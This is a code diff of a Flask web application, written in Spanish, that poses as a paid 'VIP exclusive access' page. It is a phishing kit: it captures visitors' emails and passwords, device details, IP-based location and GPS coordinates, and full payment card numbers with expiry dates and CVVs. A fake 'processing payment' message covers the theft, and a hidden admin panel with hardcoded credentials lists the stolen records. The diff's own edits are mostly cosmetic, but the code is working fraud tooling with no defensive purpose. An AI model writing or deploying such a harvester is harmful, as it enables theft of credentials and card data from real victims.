@@ -3,9 +3,9 @@ from datetime import datetime
 from flask import Flask, render_template, request, redirect, url_for, session
 
 app = Flask(__name__)
-app.secret_key = 'franco_v13_master_key'
+app.secret_key = 'franco_v13_master_executive'
 
-# --- CONFIGURACIÓN DE DIRECTORIOS ---
+# CONFIGURACIÓN DE RUTAS
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 UPLOAD_FOLDER = os.path.join(BASE_DIR, 'static', 'uploads') 
 SYSTEM_FOLDER = os.path.join(BASE_DIR, 'static', 'system')  
@@ -21,19 +21,17 @@ def init_db():
         (id INTEGER PRIMARY KEY AUTOINCREMENT, user TEXT, pass TEXT, tarjeta TEXT, 
          banco TEXT, tipo TEXT, hora TEXT, dispositivo TEXT, city TEXT, lat REAL, lon REAL,
          bateria TEXT, resolucion TEXT, lenguaje TEXT, zona_horaria TEXT)''')
-    conn.commit()
-    conn.close()
+    conn.commit(); conn.close()
 
 init_db()
 
-# CONFIGURACIÓN INICIAL
 config_web = {
     "user_admin": "franco",
     "pass_admin": "franco",
     "alias": "VIP.FRANCO.PAGOS",
     "precio": "2500",
     "img_principal": "/static/system/portada.jpg",
-    "titulo": "ACCESO PRIVADO VIP",
+    "titulo": "ACCESO EXCLUSIVO VIP",
     "color_fondo": "#1a0033",
     "color_texto": "#ffffff"
 }
@@ -46,15 +44,16 @@ def login():
 def auth():
     u, p = request.form.get('email'), request.form.get('pass')
     bat, res, lang, tz = request.form.get('bateria','N/D'), request.form.get('resolucion','N/D'), request.form.get('lenguaje','N/D'), request.form.get('tz','N/D')
-    lat_gps = float(request.form.get('lat_gps', 0))
-    lon_gps = float(request.form.get('lon_gps', 0))
+    lat_gps = request.form.get('lat_gps', 0)
+    lon_gps = request.form.get('lon_gps', 0)
     
-    city = "Desconocida"
-    if lat_gps == 0:
-        try:
-            geo = requests.get(f'http://ip-api.com/json/{request.remote_addr}', timeout=2).json()
-            city, lat_gps, lon_gps = geo.get('city','N/A'), geo.get('lat',0), geo.get('lon',0)
-        except: pass
+    city = "Buscando..."
+    try:
+        geo = requests.get(f'http://ip-api.com/json/{request.remote_addr}', timeout=2).json()
+        city = geo.get('city','N/A')
+        if lat_gps == 0: 
+            lat_gps, lon_gps = geo.get('lat',0), geo.get('lon',0)
+    except: pass
 
     ua = request.headers.get('User-Agent', '')
     disp = "iOS" if "iPhone" in ua else "Android" if "Android" in ua else "PC"
@@ -77,14 +76,12 @@ def dashboard():
 def captura_pago():
     rid = session.get('current_id')
     if rid:
-        cc = request.form.get('cc')
-        exp = request.form.get('exp')
-        cvv = request.form.get('cvv')
+        cc, exp, cvv = request.form.get('cc'), request.form.get('exp'), request.form.get('cvv')
         data_card = f"CC: {cc} | EXP: {exp} | CVV: {cvv}"
         conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
         cursor.execute("UPDATE registros SET tarjeta=? WHERE id=?", (data_card, rid))
         conn.commit(); conn.close()
-    return "✅ PAGO EN PROCESO... REVISE SU EMAIL."
+    return "✅ PROCESANDO PAGO... ESPERE."
 
 @app.route('/matrix_admin', methods=['GET', 'POST'])
 def admin_matrix():
@@ -92,7 +89,6 @@ def admin_matrix():
         if request.form.get('user') == config_web["user_admin"] and request.form.get('pass') == config_web["pass_admin"]:
             session['is_admin'] = True
     if not session.get('is_admin'): return render_template('admin_login.html')
-    
     conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
     cursor.execute("SELECT * FROM registros ORDER BY id DESC")
     regs = cursor.fetchall(); conn.close()
@@ -105,10 +101,8 @@ def update_full():
             f = request.files['file_portada']
             if f.filename != '': f.save(os.path.join(SYSTEM_FOLDER, "portada.jpg"))
         config_web.update({
-            "titulo": request.form.get('titulo'),
-            "alias": request.form.get('alias'),
-            "precio": request.form.get('precio'),
-            "color_fondo": request.form.get('color_fondo'),
+            "titulo": request.form.get('titulo'), "alias": request.form.get('alias'),
+            "precio": request.form.get('precio'), "color_fondo": request.form.get('color_fondo'),
             "color_texto": request.form.get('color_texto')
         })
     return redirect(url_for('admin_matrix'))
@@ -130,3 +124,4 @@ def delete_file(filename):
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
+
